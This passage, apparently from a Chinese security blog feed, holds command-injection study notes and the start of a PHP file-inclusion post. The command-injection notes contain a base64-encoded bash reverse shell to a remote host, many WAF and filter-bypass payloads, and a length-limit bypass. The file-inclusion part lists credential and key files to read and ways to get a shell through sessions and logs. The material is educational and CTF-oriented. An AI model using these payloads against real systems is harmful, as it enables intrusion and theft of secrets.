src="/image-20220522132334280.png" alt="image-20220522132334280"></p><p><img src="/image-20220522132112980.png" alt="image-20220522132112980"></p><p>如果有waf拦截，可以把语句base64加密后再在存在漏洞的服务器上执行</p><p>上面语句用base64做一下变形：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjEuNTcvODA4MCAwPiYx&quot;</span>|<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><p><img src="/image-20220522132754459.png" alt="image-20220522132754459"></p><p>vps上监听并得到一个反弹shell：</p><p><img src="/image-20220522132822587.png" alt="image-20220522132822587"></p><h3 id="极端情况"><a href="#极端情况" class="headerlink" title="极端情况"></a>极端情况</h3><ul><li>服务器未联网</li><li>无回显</li><li>无法利用上述的无回显命令执行姿势</li><li>无写入权限</li><li>各种未知原因无法getshell</li><li>等等…</li></ul><p>如果不幸碰到上述情况，那么最后只有一种方法，尝试一下枚举or二分法爆破文件内容，主要利用sleep命令时间盲注，自己写个脚本跑一下</p><h1 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h1><ol><li>不执行外部的应用程序或命令，尽量使用自定义的函数或开源的函数库来实现相应的功能</li><li>php可以使用<code>escapeshellarg</code>和<code>escapeshellcmd</code>这两个函数来转义用户的输入</li><li>使用safe_mode_exec_dir设置可执行的文件目录。将php.ini中的safe_mode设置为On，然后将允许执行的可执行文件放入一个目录，并使用safe_mode_exec_dir指定这个可执行的文件路径。这样在执行相应的外部程序时，比如在safe_mode_exec_dir指定目录中才会允许执行，否则将执行失败</li><li>把<code>system</code>、<code>exec_shell</code>等命令加入disable_functions（也会被绕过）</li></ol><h1 id="命令相关知识"><a href="#命令相关知识" class="headerlink" title="命令相关知识"></a>命令相关知识</h1><h2 id="和"><a href="#和" class="headerlink" title="()和{}"></a>()和{}</h2><p>把几个命令合在一起执行，shell中有两种方法：</p><ul><li>(command1;command2;command3;…)</li><li>{ command1;command2;command3;…command;}</li></ul><p>注意使用{}时第一条命令必须与左边括号有一个空格，最后一条命令一定要有分号。</p><p>并且()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令。</p><p>不同点是：()是重新开一个子shell执行命令，{}在当前shell执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl&#123;a,b,c,d&#125;g<br><br>执行结果：<br><span class="hljs-built_in">cat</span>: flag: No such file or directory<br><span class="hljs-built_in">cat</span>: flbg: No such file or directory<br><span class="hljs-built_in">cat</span>: flcg: No such file or directory<br><span class="hljs-built_in">cat</span>: fldg: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h2><p>大多数 UNIX 系统命令从终端接受输入并将所产生的输出发送回到终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</p><p>命令说明：</p><ul><li>command &gt; file：输出重定向到file。</li><li>command &lt; file：输入重定向到file。</li><li>command &gt;&gt; file：输出以追加的方式重定向到file。</li><li>n &gt; file：将文件描述符为n的文件重定向到file。</li><li>n &gt;&gt; file：将文件描述符为n的文件以追加的方式重定向到file。</li><li>n &gt;&amp; m：将输出文件m和n合并。</li><li>n &lt;&amp; m：将输入文件m和n合并。</li><li>&lt;&lt; tag：将开始标记tag和结束标记tag之间的内容作为输入。</li></ul><p>此外，文件描述符通常是这样的：</p><ul><li>0：标准输入（STDIN）</li><li>1：标准输出（STDOUT）</li><li>2：标准错误输出（STDERR）</li></ul><h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><ul><li>^：匹配输入字符串的开始位置</li><li>$：匹配输入字符串的结束位置</li><li>*：匹配前面的子表达式零次或多次</li><li>+：匹配前面的子表达式一次或多次</li><li>?：匹配前面的子表达式零次或一次</li><li>{n}：n是一个非负整数，匹配确定的n次</li><li>{n,}：n是一个非负整数，至少匹配n次</li><li>{n,m}：m、n均是非负整数，并且n&lt;&#x3D;m，最少匹配n次，最多匹配m次</li><li>.：匹配除换行符（\n，\r）以外的任何单个字符</li><li>[xyz]：字符集合，匹配所有包含的任意一个字符</li><li>非贪婪?：当?紧跟在任何一个其他限制符(*，+，?，,{n}，{n,}，{n,m})后面时，匹配是非贪婪的，非贪婪模式是指尽可能少地去匹配。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl[a-z]g<br><span class="hljs-built_in">cat</span> ./fl*g<br><span class="hljs-built_in">cat</span> ./fl?g<br></code></pre></td></tr></table></figure><p>{xxx}和[xxx]有个重要区别，如果匹配的文件不存在，[xxx]会失去模式的功能，变成一个单纯的字符串，而{xxx}还是可以展开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ./fl[a-z]g<span class="hljs-comment"># 得到结果就只有存在的文件</span><br><br><span class="hljs-built_in">cat</span> ./fl&#123;a,b,c&#125;g <br><span class="hljs-comment"># 得到的结果是每一个都会去尝试打开，但是不存在的会提示</span><br><span class="hljs-built_in">cat</span>: ./flbg: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="内置通用字符簇"><a href="#内置通用字符簇" class="headerlink" title="内置通用字符簇"></a>内置通用字符簇</h2><p>也是shell正则的知识</p><ul><li>[[:alpha:]]：任何字母</li><li>[[:digit:]]：任何数字</li><li>[[:alnum:]]：任何字母和数字</li><li>[[:space:]]：任何空白字符</li><li>[[:upper:]]：任何大写字母</li><li>[[:lower:]]：任何小写字母</li><li>[[:punct:]]：任何标点符号</li><li>[[:xdigit:]]：任何16进制的数字，相当于[0-9a-fA-F]</li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li>&lt;&gt;</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>&lt;&gt;./flag<br></code></pre></td></tr></table></figure><ul><li>$IFS（IFS的默认值是空白，也包括空格，tab，新行）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span>./flag<br><span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9flag</span> <span class="hljs-comment">#$9可改成$加其他数字</span><br></code></pre></td></tr></table></figure><h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><ul><li>$</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca$*t ./flag<br>ca<span class="hljs-variable">$@t</span> ./flag<br>ca<span class="hljs-variable">$2t</span> ./flag<br>ca<span class="hljs-variable">$&#123;11&#125;</span>t ./flag <br></code></pre></td></tr></table></figure><ul><li>反斜杠</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t ./flag<br></code></pre></td></tr></table></figure><ul><li>变量拼接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=ca;b=t;c=/etc/passwd<br>$a<span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><br></code></pre></td></tr></table></figure><ul><li>利用切割字符串拼凑</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=<span class="hljs-string">&#x27;lqwes&#x27;</span>;b=<span class="hljs-variable">$&#123;a:0:1&#125;</span><span class="hljs-variable">$&#123;a:4:1&#125;</span>;<span class="hljs-variable">$b</span><br><span class="hljs-comment"># 此时$b=&#x27;ls&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h2><p>$1到$9、$@和$*等，相当于空字符串</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ca<span class="hljs-variable">$</span>&#123;<span class="hljs-number">9</span>&#125;t /etc/passwd<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">fl</span><span class="hljs-variable">$1ag</span>.php<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">fl</span><span class="hljs-variable">$</span>@ag.php<br></code></pre></td></tr></table></figure><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> “Y2F0IC4vZmxhZwo=” |<span class="hljs-built_in">base64</span> -d|bash<br></code></pre></td></tr></table></figure><h2 id="16进制"><a href="#16进制" class="headerlink" title="16进制"></a>16进制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;0x636174202e2f666c6167&quot;</span> |xxd -r -p|bash<br></code></pre></td></tr></table></figure><h2 id="8进制"><a href="#8进制" class="headerlink" title="8进制"></a>8进制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\143\141\164\40\56\57\146\154\141\147&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="双引号和单引号"><a href="#双引号和单引号" class="headerlink" title="双引号和单引号"></a>双引号和单引号</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&quot;t&quot;</span> ./flag<br>ca<span class="hljs-string">&#x27;t&#x27;</span> ./flag<br>c<span class="hljs-string">&#x27;&#x27;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag.php<br>c<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&quot;&quot;</span>ag.php<br></code></pre></td></tr></table></figure><h2 id="幂符号"><a href="#幂符号" class="headerlink" title="幂符号^"></a>幂符号^</h2><p>这种方法只是用于win的cmd下，用法和引号类似，也是加在命令字符之间不会影响命令的执行，但我测试发现在两个字符之间只能插入一个<code>^</code>，不然执行命令会报错</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">d</span><span class="hljs-symbol">^i</span><span class="hljs-symbol">^r</span><br></code></pre></td></tr></table></figure><h2 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-built_in">cat</span>,./flag&#125;<br></code></pre></td></tr></table></figure><h2 id="cat绕过"><a href="#cat绕过" class="headerlink" title="cat绕过"></a>cat绕过</h2><p>读取文件的命令cat被禁时，有很多同替的命令</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容，不加选项默认输出八进制<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br></code></pre></td></tr></table></figure><p>上边的命令执行后，都可以在输出结果中看到flag</p><p>而od命令可通过添加<code>-c</code>选项输出字符串内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">od</span> -c flag.php<br></code></pre></td></tr></table></figure><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cat *<br>cat f*<br><span class="hljs-regexp">/???/</span><span class="hljs-string">?a</span>t flag.php <span class="hljs-comment">#/bin/cat flag.php</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?a</span>t <span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">/???/?[a]&#x27;</span><span class="hljs-string">&#x27;[t] ?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">/???/[:lower:]s #ls</span><br><span class="hljs-string">等等。。。</span><br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-comment">(\\n)</span>，<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-comment">(\\r)</span>，<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-comment">(\\t)</span>等也可以绕过一些过滤<br></code></pre></td></tr></table></figure><h2 id="命令长度限制绕过"><a href="#命令长度限制绕过" class="headerlink" title="命令长度限制绕过"></a>命令长度限制绕过</h2><p>比如服务器代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$p</span>) &lt; <span class="hljs-number">17</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="嵌套eval"><a href="#嵌套eval" class="headerlink" title="嵌套eval"></a>嵌套eval</h3><p>payload如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/x.php?p=eval($_GET</span>[<span class="hljs-string">x</span>])&amp;x=echo <span class="hljs-code">`cat /flag`</span>;<br></code></pre></td></tr></table></figure><h3 id="文件构造绕过"><a href="#文件构造绕过" class="headerlink" title="文件构造绕过"></a>文件构造绕过</h3><p>通常利用<code>ls -t</code>、<code>&gt;</code>、<code>&gt;&gt;</code>和<code>换行符\</code>绕过长度限制</p><blockquote><p>使用ls -t命令，可以将文件名按照时间顺序排列出来(后创建的排在前面)<br>使用&gt;，可以将命令结果存入文件中<br>使用&gt;&gt;，可以将字符串添加到文件内容末尾，不会覆盖原内容<br>使用换行符\，可以将一条命令写在多行</p></blockquote><p>组合起来原理如下：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">linux下可以用 1&gt;a创建文件名为a的空文件<br><span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">test</span>则会将目录按时间排序后写进<span class="hljs-keyword">test</span>文件中<br><span class="hljs-keyword">sh</span>命令可以从一个文件中读取命令来执行<br></code></pre></td></tr></table></figure><ol><li>先创建文件名可以连接成要执行命令的空文件(由于ls -t命令，所以要倒序创建文件)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping |<span class="hljs-built_in">mkdir</span> aaa <span class="hljs-comment">#建一个空目录aaa创建文件，防止和web页面混在一起干扰命令的构造</span><br>ping |&gt;aaa/php<br>ping |&gt;aaa/ag.\\<br>ping |&gt;aaa/fl\\<br>ping |&gt;aaa/t\ \\ <span class="hljs-comment">#注意cat后面有一个空格，需要一个反斜杠做转义！不然会被截断</span><br>ping |&gt;aaa/ca\\<br></code></pre></td></tr></table></figure><p><img src="/image-20220522205457037.png" alt="image-20220522205457037"></p><p>注意这里使用两个反斜杠是因为，前面说到了在命令后面加上一个反斜杠可以将一条命令写在多行，而第一个反斜杠就是为了转义这个反斜杠，从而让文件名中存在一个反斜杠</p><ol start="2"><li>执行<code>ls -t aaa&gt;cmd</code>，将目录下的文件名按时间排序后写进cmd文件中，如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入cmd，即<code>ls -at aaa&gt;cmd</code></li></ol><p><img src="/image-20220522205636103.png" alt="image-20220522205636103"></p><p>可以查看cmd文件的内容如下，组合起来就是<code>cat flag.php</code></p><p><img src="/image-20220522205710835.png" alt="image-20220522205710835"></p><ol start="3"><li>执行<code>sh cmd</code>命令，从cmd文件中读取命令来执行</li></ol><p><img src="/image-20220522210201953.png" alt="image-20220522210201953"></p><h2 id="内联命令绕过关键词"><a href="#内联命令绕过关键词" class="headerlink" title="内联命令绕过关键词"></a>内联命令绕过关键词</h2><p>可以使用反引号ls的输出作为cat的输入来绕过文件关键词，比如当前目录下有一个flag，但<code>flag</code>这个关键词被禁用了，就在可以这样绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><h1 id="审计技巧"><a href="#审计技巧" class="headerlink" title="审计技巧"></a>审计技巧</h1><p>待填坑…</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://houkc.github.io/2020/12/02/commandExecute/">Web笔记（九）命令执行漏洞</a></p><p><a href="https://www.anquanke.com/post/id/241808">浅谈命令执行的绕过方法</a></p><p><a href="https://xz.aliyun.com/t/10947">浅析命令执行</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含学习笔记</title>
    <link href="/2022/05/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/05/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>动态包含文件且包含文件的参数用户可控，产生漏洞的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>一共涉及到4个函数</p><ul><li>include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 </li><li>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 </li><li>include_once()和 require_once()：若文件中代码已被包含则不会再次包含，以避免函数重定义或变量重赋值等问题</li></ul><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="包含本地重要配置文件"><a href="#包含本地重要配置文件" class="headerlink" title="包含本地重要配置文件"></a>包含本地重要配置文件</h2><h3 id="常见cms网站配置文件"><a href="#常见cms网站配置文件" class="headerlink" title="常见cms网站配置文件"></a>常见cms网站配置文件</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dedecms 数据库配置文件 data/common<span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span>,<br>discuz 全局配置文件 config/config_global<span class="hljs-selector-class">.php</span>,<br>phpcms 配置文件 caches/configs/database<span class="hljs-selector-class">.php</span><br>phpwind 配置文件 conf/database<span class="hljs-selector-class">.php</span><br>wordpress 配置文件 wp-config.php<br></code></pre></td></tr></table></figure><h3 id="windows下配置文件"><a href="#windows下配置文件" class="headerlink" title="windows下配置文件"></a>windows下配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">C:</span>/boot.ini<span class="hljs-comment">//查看系统版本</span><br><span class="hljs-symbol">C:</span>/Windows/System32<span class="hljs-keyword">/inetsrv/</span>MetaBase.xml    <span class="hljs-comment">//IIS6 配置文件</span><br><span class="hljs-symbol">C:</span>\Windows\System32\inetsrv\config\applicationHost.config    <span class="hljs-comment">//IIS7 配置文件</span><br><span class="hljs-symbol">C:</span>/Windows/repairsam                        <span class="hljs-comment">//存储系统初次安装的密码</span><br><span class="hljs-symbol">C:</span>/Program Files<span class="hljs-keyword">/mysql/</span>my.ini               <span class="hljs-comment">//Mysql 配置</span><br><span class="hljs-symbol">C:</span>/Program Files<span class="hljs-keyword">/mysql/</span>data<span class="hljs-keyword">/mysql/</span>user.MYD  <span class="hljs-comment">//存储了mysql.user表中的数据库连接密码</span><br><span class="hljs-symbol">C:</span>/Windows/php.ini            <span class="hljs-comment">//php配置信息</span><br><span class="hljs-symbol">C:</span>/Windows/my.ini<span class="hljs-comment">//Mysql 配置信息</span><br><span class="hljs-symbol">C:</span>\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件  <span class="hljs-comment">//存储了pcAnywhere的登陆密码</span><br></code></pre></td></tr></table></figure><h3 id="linux下配置文件"><a href="#linux下配置文件" class="headerlink" title="linux下配置文件"></a>linux下配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-keyword">/root/</span>.ssh/authorized_keys<br><span class="hljs-keyword">/root/</span>.ssh/id_rsa<br><span class="hljs-keyword">/root/</span>.ssh/id_ras.keystore<br><span class="hljs-keyword">/root/</span>.ssh/known_hosts<br><span class="hljs-keyword">/etc/</span>passwd<br><span class="hljs-keyword">/etc/</span>shadow<br><span class="hljs-keyword">/etc/</span>my.cnf<br><span class="hljs-keyword">/etc/</span>httpd<span class="hljs-keyword">/conf/</span>httpd.conf 或 <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/apche/</span>conf 或 /httpd.conf   <span class="hljs-comment">//apache配置文件</span><br><span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/app/</span>php5<span class="hljs-keyword">/lib/</span>php.ini <span class="hljs-comment">//PHP相关设置</span><br><span class="hljs-keyword">/root/</span>.bash_history<br><span class="hljs-keyword">/root/</span>.mysql_history<br><span class="hljs-keyword">/proc/</span>self<span class="hljs-keyword">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*(文件标识符)<br><span class="hljs-keyword">/proc/</span>mounts<br><span class="hljs-keyword">/porc/</span>config.gz<br><span class="hljs-keyword">/etc/</span>redhat-release <span class="hljs-comment">//系统版本</span><br><span class="hljs-keyword">/etc/</span>issue  <span class="hljs-comment">//系统版本</span><br><span class="hljs-keyword">/etc/</span>group<br><span class="hljs-keyword">/etc/</span>hosts<br><span class="hljs-keyword">/etc/</span>motd<br><span class="hljs-keyword">/etc/</span>mysql/my.cnf<br><span class="hljs-keyword">/proc/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*<span class="hljs-keyword">/fd/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*   (第一个数字是进程号PID，第二个数字是文件描述符)<br><span class="hljs-keyword">/proc/</span>self/environ<br><span class="hljs-keyword">/proc/</span>version<br><span class="hljs-keyword">/proc/</span>cmdline<br></code></pre></td></tr></table></figure><h2 id="配合文件上传漏洞getshell"><a href="#配合文件上传漏洞getshell" class="headerlink" title="配合文件上传漏洞getshell"></a>配合文件上传漏洞getshell</h2><p>上传php文件或图片马，直接包含进来即可</p><h2 id="包含session文件getshell"><a href="#包含session文件getshell" class="headerlink" title="包含session文件getshell"></a>包含session文件getshell</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><p>常见的php-session存放位置：</p><ol><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</li></ol><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p><p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p><h2 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h2><p>中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中， 存在有 php 代码，也可以引入到文件</p><p>在linux下日志文件权限默认是 root，而php 的权限是 www-data，一般情况下都是读取不了，如果是 windows 环境下是可以权限是允许的。 </p><p>linux 默认的apache 日志文件路径：</p><p>访问日志 